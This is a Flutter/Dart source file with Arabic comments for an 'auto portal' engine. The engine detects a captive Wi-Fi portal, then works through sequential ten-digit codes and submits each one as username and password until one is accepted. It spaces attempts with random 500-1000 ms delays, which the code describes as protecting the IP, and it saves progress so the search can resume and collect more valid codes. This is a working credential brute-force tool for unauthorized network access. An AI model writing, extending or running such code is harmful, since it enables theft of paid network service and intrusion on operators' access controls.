import 'dart:async';
import 'dart:math';

import 'package:flutter/foundation.dart';

import '../data/models/attempt_log.dart';
import '../data/models/login_outcome.dart';
import '../data/services/captive_portal_detector.dart';
import '../data/services/portal_client.dart';
import '../data/services/state_store.dart';
import 'logs_controller.dart';

/// دالة محاولة بوابة (قابلة للحقن للاختبارات): نجحت؟
typedef PortalAttemptFn = Future<bool> Function(String portalUrl, String code);

/// دالة كشف البوابة (قابلة للحقن للاختبارات).
typedef DetectFn = Future<CaptivePortalInfo> Function();

/// دالة اختيار التأخير بين المحاولات (قابلة للحقن للاختبارات).
typedef DelayPickFn = int Function();

/// محرّك الواجهة الخامسة: كشف تلقائي للبوابة + توليد أرقام بعشرة خانات +
/// محاولات حقيقية + توقف ذكي عند أول رمز صحيح + حفظ واستئناف الجلسة.
///
/// الحلقة كلها بأوامر غير حاجبة (await) — لا يُجمّد خيط الواجهة أبداً.
class AutoPortalController extends ChangeNotifier {
  AutoPortalController({
    required CaptivePortalDetector detector,
    required StateStore store,
    LogsController? logsController,
    PortalAttemptFn? attemptFn,
    DetectFn? detectFn,
    DelayPickFn? delayPickFn,
  })  : _detector = detector,
        _store = store,
        _logsController = logsController,
        _attemptFn = attemptFn ?? _defaultAttempt,
        _detectFn = detectFn ?? (() => detector.detect()),
        _delayPickFn = delayPickFn ?? _defaultDelay {
    unawaited(_restore());
  }

  final CaptivePortalDetector _detector;
  final StateStore _store;
  final LogsController? _logsController;
  final PortalAttemptFn _attemptFn;
  final DetectFn _detectFn;
  final DelayPickFn _delayPickFn;
  bool _disposed = false;
  bool _startedOnce = false;
  bool _hasRestoredSession = false;

  // ------------------------------------------------------------ الحالة
  /// هل المحرّك يعمل (مراقبة + محاولات)؟
  bool monitoring = false;

  /// إيقاف مؤقت بطلب المستخدم.
  bool paused = false;

  /// توقف ذكي تلقائي بعد اكتشاف رمز صحيح.
  bool smartPaused = false;

  /// هل اكتُشفت بوابة مقيدة؟
  bool portalDetected = false;

  /// الرابط المستهدف (يُملأ تلقائياً وقابل للتعديل).
  String portalUrl = '';

  /// رقم البداية المكتوب يدوياً (فارغ = 0000000001).
  String startInput = '';

  /// الرقم الحالي قيد الفحص.
  int currentNumber = 1;

  /// عدد المحاولات المنفذة.
  int attempts = 0;

  /// نص الحالة الحية.
  String statusText = 'جاهز — اضغط «بدء تلقائي»';

  /// حالة الاتصال المعروضة.
  String connectionLabel = 'غير معروف';

  /// طريقة آخر اكتشاف.
  String detectionMethod = '';

  /// آخر رمز مكتشف (للواجهة الفرعية).
  FoundCode? lastFound;

  /// الرموز المكتشفة (الأحدث أولاً).
  List<FoundCode> foundCodes = <FoundCode>[];

  /// رسالة خطأ آنية.
  String? error;

  /// الرمز اليدوي الحر (خانة التجربة اليدوية).
  String manualCode = '';

  /// هل جارٍ فحص الرمز اليدوي؟
  bool manualTesting = false;

  /// نتيجة آخر تجربة يدوية (للعرض).
  String? manualResult;

  /// نتيجة آخر تجربة يدوية: true نجاح / false فشل / null قيد التنفيذ.
  bool? manualSuccess;

  // --------------------------------------------------------- مساعدات ثابتة
  /// تنسيق الرقم بعشرة خانات بأصفار يسارية.
  static String formatCode(int value) => value.toString().padLeft(10, '0');

  /// تحليل رقم البداية: فارغ/غير صالح ⇒ 1.
  static int parseStart(String raw) {
    final String text = raw.trim();
    if (text.isEmpty) return 1;
    final int? value = int.tryParse(text);
    if (value == null || value < 1) return 1;
    return value;
  }

  /// تقييد التأخير بين 500 و1000 مللي ثانية.
  static int clampDelay(int ms) => ms.clamp(500, 1000).toInt();

  /// تأخير افتراضي عشوائي 500-1000 مللي ثانية (حماية الاتصال وIP).
  static int _defaultDelay() => 500 + Random().nextInt(501);

  /// محاولة حقيقية عبر PortalClient: الرمز اسم مستخدم وكلمة مرور معاً.
  static Future<bool> _defaultAttempt(String portalUrl, String code) async {
    final LoginOutcome outcome = await const PortalClient().attempt(
      baseUrl: portalUrl,
      username: code,
      password: code,
      destination: '',
    );
    return outcome.success;
  }

  // ------------------------------------------------------------ الإدخال
  /// تحديث الرابط المستهدف يدوياً.
  void setPortalUrl(String value) {
    portalUrl = value;
    notifyListeners();
  }

  /// تحديث رقم البداية.
  void setStartInput(String value) {
    startInput = value;
    notifyListeners();
  }

  /// تحديث الرمز اليدوي الحر.
  void setManualCode(String value) {
    manualCode = value;
    notifyListeners();
  }

  /// تجربة يدوية حرة: رمز واحد يكتبه المستخدم يُجرَّب فوراً على البوابة
  /// بنفس المحرك الحقيقي — وعند النجاح يدخل قائمة الرموز المكتشفة
  /// بنافذة النسخ، دون لمس عدّاد التوليد التلقائي.
  Future<void> tryManualCode() async {
    if (_disposed || manualTesting) return;
    final String code = manualCode.trim();
    final String url = portalUrl.trim();
    if (code.isEmpty) {
      manualSuccess = false;
      manualResult = 'أدخل رمزاً للتجربة أولاً';
      notifyListeners();
      return;
    }
    if (url.isEmpty) {
      manualSuccess = false;
      manualResult = 'لا يوجد رابط — اكشف البوابة أولاً';
      notifyListeners();
      return;
    }
    if (monitoring) {
      manualSuccess = false;
      manualResult = 'أوقف المحرك التلقائي أولاً ثم جرّب يدوياً';
      notifyListeners();
      return;
    }
    manualTesting = true;
    manualSuccess = null;
    manualResult = 'جارٍ تجربة $code على البوابة...';
    notifyListeners();
    bool ok = false;
    try {
      ok = await _attemptFn(url, code);
    } catch (_) {
      ok = false;
    }
    if (_disposed) return;
    manualTesting = false;
    manualSuccess = ok;
    manualResult = ok
        ? 'الرمز صحيح — البوابة قَبِلته!'
        : 'الرمز غير صحيح';
    _pushLog(code, ok, manual: true);
    if (ok) {
      final FoundCode found =
          FoundCode(code: code, discoveredAt: DateTime.now());
      foundCodes = <FoundCode>[found, ...foundCodes].take(20).toList();
      lastFound = found;
      await _persist();
    }
    notifyListeners();
  }

  // ------------------------------------------------------------ الكشف
  /// فحص فوري للبوابة وتحديث الحالة.
  Future<void> detectPortal() async {
    if (_disposed) return;
    try {
      statusText = 'جارٍ فحص الشبكة...';
      notifyListeners();
      final CaptivePortalInfo info = await _detectFn();
      if (_disposed) return;
      portalDetected = info.detected;
      detectionMethod = info.method;
      connectionLabel = info.validated == null
          ? 'غير معروف'
          : (info.validated! ? 'متحقق — إنترنت مفتوح' : 'غير متحقق — بوابة محتملة');
      if (info.detected &&
          info.portalUrl != null &&
          info.portalUrl!.isNotEmpty) {
        portalUrl = info.portalUrl!;
      }
      statusText = info.detected
          ? 'بوابة مقيدة مكتشفة — الرابط جاهز'
          : 'لا بوابة مقيدة حالياً — تستمر المراقبة';
      notifyListeners();
    } catch (e) {
      if (_disposed) return;
      statusText = 'تعذّر الكشف — تعاد المحاولة تلقائياً';
      error = '$e';
      notifyListeners();
    }
  }

  // ------------------------------------------------------------ التحكم
  /// زر «بدء تلقائي»: مراقبة + كشف + محاولات — كل شيء تلقائي.
  Future<void> start() async {
    if (monitoring || _disposed) return;
    monitoring = true;
    paused = false;
    smartPaused = false;
    error = null;
    if (!_startedOnce && !_hasRestoredSession) {
      currentNumber = parseStart(startInput);
    }
    _startedOnce = true;
    statusText = 'بدأ الوضع التلقائي — كشف واتصال';
    notifyListeners();
    unawaited(_engineLoop());
  }

  /// إيقاف مؤقت بطلب المستخدم.
  void pause() {
    if (!monitoring || _disposed) return;
    paused = true;
    statusText = 'إيقاف مؤقت — اضغط «استئناف»';
    notifyListeners();
  }

  /// استئناف: من الإيقاف اليدوي ومن التوقف الذكي بعد النجاح.
  void resumeEngine() {
    if (!monitoring || _disposed) return;
    if (smartPaused) {
      // نكمل البحث عن بقية الرموز: نتجاوز الرمز المكتشف.
      currentNumber++;
      lastFound = null;
      unawaited(_persist());
    }
    smartPaused = false;
    paused = false;
    statusText = 'استؤنف — البحث مستمر';
    notifyListeners();
  }

  /// إعادة ضبط: يبدأ من رقم البداية ويصفر المحاولات.
  Future<void> reset() async {
    if (_disposed) return;
    currentNumber = parseStart(startInput);
    attempts = 0;
    smartPaused = false;
    paused = false;
    lastFound = null;
    statusText = 'أُعيد الضبط — يبدأ من ${formatCode(currentNumber)}';
    await _persist();
    notifyListeners();
  }

  /// إيقاف كامل للمحرك.
  Future<void> stop() async {
    if (_disposed) return;
    monitoring = false;
    paused = false;
    smartPaused = false;
    statusText = 'موقوف — اضغط «بدء تلقائي»';
    await _persist();
    notifyListeners();
  }

  // ------------------------------------------------------------ الحلقة
  Future<void> _engineLoop() async {
    while (monitoring && !_disposed) {
      // الإيقاف اليدوي: انتظار الاستئناف.
      while (paused && monitoring && !_disposed) {
        await Future<void>.delayed(const Duration(milliseconds: 250));
      }
      if (!monitoring || _disposed) break;

      // التوقف الذكي بعد نجاح: يعلق حتى «استئناف».
      if (smartPaused) {
        statusText = 'توقف ذكي — رمز صحيح بانتظار النسخ أو الاستئناف';
        notifyListeners();
        await Future<void>.delayed(const Duration(milliseconds: 300));
        continue;
      }

      // لا رابط بعد: كشف تلقائي دوري حتى تظهر بوابة.
      final String url = portalUrl.trim();
      if (url.isEmpty) {
        statusText = 'مراقبة الشبكة — كشف تلقائي للبوابة...';
        notifyListeners();
        await detectPortal();
        if (!monitoring || _disposed) break;
        if (portalUrl.trim().isEmpty) {
          for (int i = 0;
              i < 8 && monitoring && portalUrl.trim().isEmpty && !_disposed;
              i++) {
            await Future<void>.delayed(const Duration(milliseconds: 500));
          }
        }
        continue;
      }

      // محاولة حقيقية واحدة بالرمز الحالي.
      final String code = formatCode(currentNumber);
      statusText = 'جارٍ فحص $code...';
      notifyListeners();

      bool ok = false;
      try {
        ok = await _attemptFn(url, code);
      } catch (_) {
        ok = false;
      }
      if (_disposed) return;
      attempts++;
      _pushLog(code, ok);

      if (ok) {
        final FoundCode found =
            FoundCode(code: code, discoveredAt: DateTime.now());
        foundCodes = <FoundCode>[found, ...foundCodes].take(20).toList();
        lastFound = found;
        smartPaused = true;
        statusText = 'اكتُشف رمز صحيح!';
        await _persist();
        notifyListeners();
        continue;
      }

      // فشل: حفظ آخر رقم، انتقال للتالي، مهلة حماية 500-1000ms.
      currentNumber++;
      await _persist();
      statusText = 'فُحص $code — الانتقال للتالي';
      notifyListeners();
      await Future<void>.delayed(
        Duration(milliseconds: clampDelay(_delayPickFn())),
      );
    }
  }

  // ------------------------------------------------------------ التخزين
  Future<void> _restore() async {
    try {
      final AutoPortalState state = await _store.load();
      if (_disposed) return;
      if (state.lastNumber > 0) {
        currentNumber = state.lastNumber;
        _hasRestoredSession = true;
        statusText = 'استُعيدت الجلسة — آخر رقم ${formatCode(state.lastNumber)}';
      }
      if (state.portalUrl.isNotEmpty) portalUrl = state.portalUrl;
      if (state.foundCodes.isNotEmpty) foundCodes = state.foundCodes;
      notifyListeners();
    } catch (_) {
      // بلا جلسة سابقة — بداية نظيفة.
    }
  }

  Future<void> _persist() async {
    try {
      await _store.save(AutoPortalState(
        lastNumber: currentNumber,
        portalUrl: portalUrl.trim(),
        foundCodes: foundCodes,
      ));
    } catch (_) {
      // فشل الحفظ لا يعطل المحرك.
    }
  }

  void _pushLog(String code, bool ok, {bool manual = false}) {
    final AttemptLog log = AttemptLog(
      id: DateTime.now().microsecondsSinceEpoch.toString(),
      timestamp: DateTime.now(),
      gateway: 'auto-portal://${portalUrl.trim()}',
      username: code,
      success: ok,
      message: manual
          ? (ok
              ? 'رمز يدوي صحيح — البوابة قَبِلته'
              : 'رمز يدوي غير صحيح')
          : (ok
              ? 'رمز صحيح — البوابة قَبِلت الرمز'
              : 'رمز غير صحيح — فُحص ورُفض'),
      durationMs: 0,
      source: manual ? AttemptSource.manual : AttemptSource.automatic,
    );
    _logsController?.addAttempt(log);
  }

  @override
  void dispose() {
    _disposed = true;
    super.dispose();
  }
}
